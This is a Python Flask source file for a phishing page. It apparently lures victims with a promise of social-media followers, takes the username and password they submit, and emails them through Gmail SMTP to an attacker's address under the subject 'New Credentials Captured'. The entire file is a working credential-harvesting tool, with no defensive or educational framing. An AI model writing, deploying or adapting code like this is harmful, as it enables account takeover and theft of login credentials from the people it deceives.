from flask import Flask, request, render_template 
import smtplib
from email.mime.text import MIMEText
import os
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

app = Flask(__name__)  

# Email configuration
GMAIL_EMAIL = os.getenv('GMAIL_EMAIL')
GMAIL_APP_PASSWORD = os.getenv('GMAIL_APP_PASSWORD')
RECEIVER_EMAIL = os.getenv('RECEIVER_EMAIL')

def send_email(username, password):
    """Send captured credentials via email"""
    try:
        # Create email content
        subject = "New Credentials Captured"
        body = f"Username: {username}\nPassword: {password}"
        
        # Create MIME message
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = GMAIL_EMAIL
        msg['To'] = RECEIVER_EMAIL
        
        # Connect to Gmail's SMTP server
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(GMAIL_EMAIL, GMAIL_APP_PASSWORD)
            server.send_message(msg)
            
        return True
    except Exception as e:
        print(f"Email sending failed: {str(e)}")
        return False

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        # Send credentials via email
        if send_email(username, password):
            return 'You will started getting your followers soon'
        else:
            return 'Error processing request. Please try again later.'
            
    return render_template('index.html')

if __name__ == '__main__':
    # Removed log directory creation as we're not using it anymore
    app.run(debug=True)
